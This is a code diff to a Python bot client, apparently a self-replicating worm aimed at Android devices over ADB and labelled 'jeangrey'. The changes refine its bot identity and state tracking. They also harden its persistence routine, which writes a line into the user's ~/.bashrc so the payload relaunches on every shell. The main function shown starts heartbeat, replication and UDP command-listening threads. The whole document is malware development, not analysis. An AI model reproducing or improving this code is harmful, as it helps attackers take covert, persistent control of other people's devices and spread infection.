@@ -22,37 +22,48 @@ def get_ip():
     finally:
         s.close()
 
-def generate_state():
+def generate_bot_state():
     global STATE_FILE
-    ip = get_ip()
-    bot_id = f"bot_{ip.replace('.', '_')}"
+    bot_ip = get_ip()
+    bot_id = f"bot_{bot_ip.replace('.', '_')}"
     STATE_FILE = f"{STATE_DIR}/{bot_id}/jeangrey_state.json"
     os.makedirs(f"{STATE_DIR}/{bot_id}", exist_ok=True)
     state = {
         "bot_id": bot_id,
-        "ip": ip,
+        "ip": bot_ip,
         "joined": time.ctime(),
         "last_seen": time.ctime(),
-        "tags": ["jeangrey", "android", "mesh", "replicator"]
+        "tags": ["jeangrey", "android", "mesh", "replicator", "active"]
     }
     with open(STATE_FILE, "w") as f:
         json.dump(state, f, indent=4)
 
-def update_last_seen():
+def update_last_seen(bot_id=None):
     try:
-        with open(STATE_FILE, "r") as f:
-            state = json.load(f)
-        state["last_seen"] = time.ctime()
-        with open(STATE_FILE, "w") as f:
-            json.dump(state, f, indent=4)
+        if not bot_id:
+            bot_ip = get_ip()
+            bot_id = f"bot_{bot_ip.replace('.', '_')}"
+        path = f"{STATE_DIR}/{bot_id}/jeangrey_state.json"
+        if os.path.exists(path):
+            with open(path, "r") as f:
+                state = json.load(f)
+            state["last_seen"] = time.ctime()
+            with open(path, "w") as f:
+                json.dump(state, f, indent=4)
     except:
         pass
 
 def gain_persistence():
     print("[*] Setting up persistence...")
     bashrc_path = os.path.expanduser("~/.bashrc")
-    with open(bashrc_path, "a") as f:
-        f.write(f"\npython {ADB_PAYLOAD} &\n")
+    try:
+        with open(bashrc_path, "r") as f:
+            existing = f.read()
+        if ADB_PAYLOAD not in existing:
+            with open(bashrc_path, "a") as f:
+                f.write(f"\npython {ADB_PAYLOAD} &\n")
+    except:
+        pass
 
 def listen_for_commands():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -86,12 +97,14 @@ def replicate():
         time.sleep(300)
 
 def heartbeat_loop():
+    bot_ip = get_ip()
+    bot_id = f"bot_{bot_ip.replace('.', '_')}"
     while True:
-        update_last_seen()
+        update_last_seen(bot_id)
         time.sleep(60)
 
 def main():
-    generate_state()
+    generate_bot_state()
     gain_persistence()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=replicate, daemon=True).start()
